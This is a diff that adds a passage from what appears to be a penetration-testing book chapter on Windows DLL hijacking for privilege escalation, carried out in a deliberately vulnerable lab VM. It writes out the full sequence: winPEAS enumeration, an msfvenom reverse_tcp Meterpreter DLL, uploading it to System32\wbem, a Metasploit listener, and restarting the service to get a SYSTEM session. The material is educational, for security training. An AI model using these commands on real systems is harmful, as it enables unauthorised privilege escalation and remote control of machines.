+    to elevate our privileges.
+  prefs: []
+  type: TYPE_NORMAL
+- en: DLL hijacking
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: Windows **DLLs** are libraries that are used or called when applications or
+    services are started. If the application or service cannot locate the required
+    DLLs, we can force the application or service to load our own DLL that will run
+    arbitrary commands in order to elevate our privileges.
+  prefs: []
+  type: TYPE_NORMAL
+- en: For this to work, we must first locate an application that runs with **SYSTEM**
+    privileges and must have the appropriate path permissions that can allow us to
+    upload our custom DLL.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Applications can load DLLs from various paths on Windows and will typically
+    follow this order:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Application path or directory
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**C:\Windows\System32**'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**C:\Windows\System**'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**C:\Windows**'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**C:\Program Files**'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: The **PATH** environment variable
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: 'We can also perform DLL hijacking on application or service DLLs that do not
+    have a defined path. The following code snippet is an example of an absolute path:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: PATH = C:\Windows\System32\example.dll
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'As you can see in the preceding code snippet, the path to the DLL is specified
+    and as a result, the application or service knows exactly where to locate it.
+    The following code snippet is an example of an undefined application or service
+    DLL path that can be exploited:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: PATH = example.dll
+  prefs: []
+  type: TYPE_NORMAL
+- en: In order to understand how this works, let's take a look at a scenario that
+    will explain and demonstrate the process in greater depth.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Setting up our environment
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: In this section, we will be utilizing the Windows 7 SP1 virtual machine that
+    we set up in [*Chapter 2*](B17389_02_Final_PG_ePub.xhtml#_idTextAnchor030), *Setting
+    Up Our Lab*, of this book. We will also be setting up a vulnerable service that
+    will be used to demonstrate the DLL hijacking process.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'To begin setting up your environment, follow this procedure:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The first step in the process will involve downloading and running a Windows
+    batch script on the Windows 7 virtual machine. The script can be downloaded from
+    this link: [https://raw.githubusercontent.com/sagishahar/lpeworkshop/master/lpe_windows_setup.bat](https://raw.githubusercontent.com/sagishahar/lpeworkshop/master/lpe_windows_setup.bat).'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: This script will be responsible for setting up the various vulnerable services
+    that will be used in the demonstrations in this chapter.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: After downloading the batch script, you will need to execute it with administrative
+    privileges as highlighted in the following screenshot:![Figure 8.22 – Setup script
+    execution options
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '](Images/B17389_08_022.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 8.22 – Setup script execution options
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: After the script has been executed, it will begin setting up the various vulnerable
+    services that we will be using in this section. After the setup process is completed,
+    you will be prompted to restart the system as illustrated in the following screenshot:![Figure
+    8.23 – Setup script complete
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '](Images/B17389_08_023.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 8.23 – Setup script complete
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'After restarting the system, we will need to start the vulnerable DLL service.
+    This can be done by running the following command in the Windows command prompt
+    on the target virtual machine:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**sc start dllsvc**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'As illustrated in the following screenshot, if the initial setup process was
+    run successfully, the service should be executed without any issues:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 8.24 – Starting the vulnerable DLL service](Images/B17389_08_024.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 8.24 – Starting the vulnerable DLL service
+  prefs: []
+  type: TYPE_NORMAL
+- en: After starting the **dllsrv** service, our vulnerable services should be up
+    and running and we should be able to move on to the exploitation phase.
+  prefs: []
+  type: TYPE_NORMAL
+- en: The DLL exploitation process
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: Now that we have our target system configured with the various vulnerable services,
+    we can begin the DLL hijacking process.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Before we commence with the demonstrations, ensure that you have established
+    an initial foothold on the target system:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: The first step in the exploitation phase involves identifying the application
+    or services with missing DLLs. This can be done through the **winPEAS** enumeration
+    tool that we used in [*Chapter 4*](B17389_04_Final_PG_ePub.xhtml#_idTextAnchor058),
+    *Performing Local Enumeration*, of this book.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: 'The winPEAS binary can be downloaded from the GitHub repository here: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe).'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'Ensure you download the correct binary based on the architecture of your target
+    operating system; the architecture-specific binaries can be found in the **binaries**
+    folder, as highlighted in the following screenshot:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 8.25 – winPEAS binaries](Images/B17389_08_025.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_IMG
+- en: Figure 8.25 – winPEAS binaries
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: After downloading the binary to our Kali virtual machine, we need to transfer
+    the **winPEAS.exe** binary to our target virtual machine.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: 'We can transfer the **winPEAS.exe** binary to the target system with Meterpreter
+    by running the following command:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '**upload /<PATH-To-BINARY>/winPEASx64.exe**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: In the event you are using a standard command shell, you can use the **certutil**
+    utility to transfer the binary to the target system.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'After uploading the **winPEAS.exe** binary to the target system, we can enumerate
+    a list of services that have missing DLLs by running the following command:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**.\winPEASx64.exe servicesinfo**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'As highlighted in the following screenshot, this will enumerate a list of services
+    with missing DLLs and their respective paths. In our case, we are able to identify
+    the application path for the **dllsvc** service that has the necessary permissions:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 8.26 – winPEAS DLL hijacking paths'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_08_026.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 8.26 – winPEAS DLL hijacking paths
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We are also able to identify the vulnerable DLL hijacking service as illustrated
+    in the following screenshot:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 8.27 – winPEAS DLL hijacking services'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_08_027.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 8.27 – winPEAS DLL hijacking services
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We can also identify missing DLLs for **dllhijackservice.exe** manually. This
+    can be done through the Process Monitor utility, which can be downloaded here:
+    [https://docs.microsoft.com/en-us/sysinternals/downloads/procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon).'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: After downloading the Process Monitor executable to the target system, we can
+    execute it and set the filter options highlighted in the following screenshot:![Figure
+    8.28 – Process Monitor result filter
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '](Images/B17389_08_028.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 8.28 – Process Monitor result filter
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: After setting the result filter with a value of **NAME NOT FOUND**, we need
+    to set up an additional path filter to only display **.dll** files, as highlighted
+    in the following screenshot:![Figure 8.29 – Process Monitor path filter](Images/B17389_08_029.jpg)
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Figure 8.29 – Process Monitor path filter
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: After adding both filters, your filter configuration should be similar to the
+    configuration in the following screenshot:![Figure 8.30 – Process Monitor Filter
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '](Images/B17389_08_030.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 8.30 – Process Monitor Filter
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: After you have set up the filters, you can apply them by clicking on the **Apply**
+    button, as highlighted in the preceding screenshot.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'These filters will only display services with missing DLLs and their respective
+    DLL names. In this case, we are able to identify the vulnerable service and the
+    missing DLL names with their respective paths, as highlighted in the following
+    screenshot:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 8.31 – Process Monitor missing DLLs'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_08_031.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 8.31 – Process Monitor missing DLLs
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: We can now generate our custom DLL that will provide us with a Meterpreter session
+    when executed.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We can generate the custom DLL with **msfvenom** and use the Meterpreter payload
+    by running the following command in Kali:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<KALI-IP> LPORT=PORT
+    -f dll > hijackme.dll**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: We will save the custom DLL file with the name of the missing DLL for the **dllhijackservice.exe**
+    service. In our case, we will hijack the **hijackme.dll** DLL.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'After generating the custom DLL, we can transfer it to the target system under
+    the respective service path. In our case, the path will be the following:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**C:\Windows\System32\wbem**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We can upload the custom DLL with Meterpreter by running the following command:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '**upload /PATH-TO-DLL/hijackme.dll**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'As highlighted in the following screenshot, the **hijackme.dll** file should
+    be uploaded to the correct path:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 8.32 – Uploading the custom DLL'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_08_032.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 8.32 – Uploading the custom DLL
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We now need to set up the Meterpreter listener with Metasploit. This can be
+    done by running the following command in the Metasploit console:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**use /exploit/multi/handler**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'The next step involves specifying the payload we used to create the binary
+    with **msfvenom**. This can be done by running the following command:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**set payload /windows/x64/meterpreter/reverse_tcp**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We now need to configure the module options. In this case, we need to configure
+    the **LHOST** and **LPORT** options as highlighted in the following screenshot:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 8.33 – Meterpreter listener options'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_08_033.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 8.33 – Meterpreter listener options
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'After setting the module options, we can start the listener by running the
+    following command:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**run**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: The listener will listen for any incoming connections from the payload we generated
+    with **msfvenom**.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'In order to execute the custom DLL, we need to restart the **dllsvc** service.
+    This can be done by running the following commands in the Windows command shell:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**sc stop dllsvc**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '**sc start dllsvc**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'If you havefollowed the steps highlighted so far correctly, you should receive
+    a Meterpreter session on the listener we had set up, as follows:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 8.34 – DLL hijack Meterpreter'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_08_034.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 8.34 – DLL hijack Meterpreter
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We can verify that we have an elevated Meterpreter session by running the following
+    command:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**getuid**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'As highlighted in the following screenshot, we have successfully elevated our
+    privileges and should have a Meterpreter session with administrative privileges:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 8.35 – getuid Meterpreter'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_08_035.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 8.35 – getuid Meterpreter
+  prefs: []
+  type: TYPE_NORMAL
+- en: We have been able to elevate our privileges by identifying missing DLLs and
+    generating a custom DLL that will be executed to provide us with an elevated Meterpreter
+    session.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Summary
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: In this chapter, we got started with understanding how to identify and exploit
+    unquoted service paths and how they can be utilized to execute a malicious binary
+    in order to elevate our privileges. We also explored the process of exploiting
+    the Windows secondary logon both manually and automatically with the Metasploit
+    framework. We then took a look at how to identify and exploit weak service permissions
+    and ended the chapter by taking an in-depth look at how to identify missing DLLs
+    and the process of performing DLL hijacking.
+  prefs: []
+  type: TYPE_NORMAL
+- en: In the next chapter, we will explore the process of privilege escalation through
+    the Windows Registry.
+  prefs: []
+  type: TYPE_NORMAL
